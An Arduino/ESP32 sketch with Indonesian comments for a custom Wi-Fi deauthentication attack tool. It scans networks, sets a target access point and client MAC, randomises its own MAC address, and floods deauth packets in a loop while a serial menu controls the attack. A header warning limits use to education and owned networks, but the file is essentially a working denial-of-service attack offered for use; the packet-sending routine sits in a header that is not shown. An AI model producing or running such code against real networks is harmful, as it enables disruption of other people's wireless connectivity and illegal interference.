/*
 *  Contoh Penggunaan Kelas WiFi_Utils Kustom
 *  
 *  PERINGATAN: Gunakan hanya untuk edukasi dan pada jaringan yang Anda miliki.
 *  Penggunaan pada jaringan orang lain adalah ILEGAL.
 */

#include <Arduino.h>
#include <string>
#include "wifi_utils.h" // Sertakan header kustom Anda

// Buat objek dari kelas WiFi_Utils
// true = gunakan MAC address acak
WiFi_Utils wifi_util(true);

// Variabel untuk menyimpan target
bool isAttacking = false;
uint8_t target_ap_bssid[6];
uint8_t target_client_mac[6];
int target_channel = 1;

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Inisialisasi sistem Wi-Fi
  wifi_util.init();

  Serial.println("Sistem siap. Gunakan Serial Monitor untuk mengontrol.");
  printMenu();
}

void loop() {
  // Logika serangan
  if (isAttacking) {
    // Ubah channel sebelum mengirim paket
    esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
    
    // Kirim paket deauth secara terus-menerus
    wifi_util.sendDeauthPacket(target_ap_bssid, target_client_mac);
    
    // LED built-in berkedip untuk indikator serangan
    digitalWrite(LED_BUILTIN, HIGH);
    delay(1);
    digitalWrite(LED_BUILTIN, LOW);
  }

  // Proses input dari Serial Monitor
  if (Serial.available() > 0) {
    char input = Serial.read();
    Serial.println(input);

    // Hentikan serangan jika ada input baru
    if (isAttacking) {
      isAttacking = false;
      Serial.println("[INFO] Serangan dihentikan.");
    }

    switch (input) {
      case '1': // Scan jaringan
        wifi_util.scanWifiList();
        printScanResults();
        printMenu();
        break;

      // Di sini Anda perlu logika untuk memilih AP dan Klien
      // Untuk contoh ini, kita akan hardcode target
      case '2': // Set target (hardcoded untuk contoh)
        // Ganti dengan MAC Address AP target Anda
        // Format: XX:XX:XX:XX:XX:XX
        parseMac("AA:BB:CC:DD:EE:FF", target_ap_bssid);
        // Ganti dengan MAC Address salah satu klien yang terhubung
        parseMac("11:22:33:44:55:66", target_client_mac);
        target_channel = 6; // Ganti dengan channel AP target

        Serial.println("[INFO] Target telah diset (hardcoded).");
        Serial.print("AP BSSID: "); printMac(target_ap_bssid);
        Serial.print("Client MAC: "); printMac(target_client_mac);
        Serial.println("Channel: " + String(target_channel));
        printMenu();
        break;

      case '3': // Mulai serangan
        if (memcmp(target_ap_bssid, "\0\0\0\0\0\0", 6) != 0) {
          Serial.println("[INFO] Memulai serangan...");
          isAttacking = true;
        } else {
          Serial.println("[ERROR] Target belum diset. Pilih target terlebih dahulu (menu 2).");
        }
        break;

      default:
        printMenu();
        break;
    }
  }
}

// --- Fungsi Bantuan ---

void printMenu() {
  Serial.println("\n--- Menu Deauther Kustom ---");
  Serial.println("1: Scan Jaringan Wi-Fi");
  Serial.println("2: Set Target (hardcoded untuk contoh)");
  Serial.println("3: Mulai Serangan");
  Serial.println("Karakter apapun: Hentikan Serangan");
  Serial.println("-------------------------------");
  Serial.print("Masukkan perintah: ");
}

void printScanResults() {
  if (wifi_util.wifi_list.num == 0) {
    Serial.println("Tidak ada jaringan ditemukan.");
    return;
  }
  Serial.println("\n--- Jaringan Ditemukan ---");
  for (int i = 0; i < wifi_util.wifi_list.num; i++) {
    Serial.print((String)(i + 1) + ": ");
    Serial.print(wifi_util.wifi_list.ssid[i]);
    Serial.print(" (");
    Serial.print(wifi_util.wifi_list.bssid[i]);
    Serial.print(", CH: ");
    Serial.print(wifi_util.wifi_list.channel[i]);
    Serial.println(")");
  }
}

// Fungsi untuk mengkonversi string MAC ke array uint8_t
void parseMac(String macStr, uint8_t* mac) {
  for (int i = 0; i < 6; ++i) {
    mac[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

// Fungsi untuk mencetak array MAC ke Serial
void printMac(const uint8_t* mac) {
  for (int i = 0; i < 6; ++i) {
    if (mac[i] < 16) Serial.print("0");
    Serial.print(mac[i], HEX);
    if (i < 5) Serial.print(":");
  }
  Serial.println();
}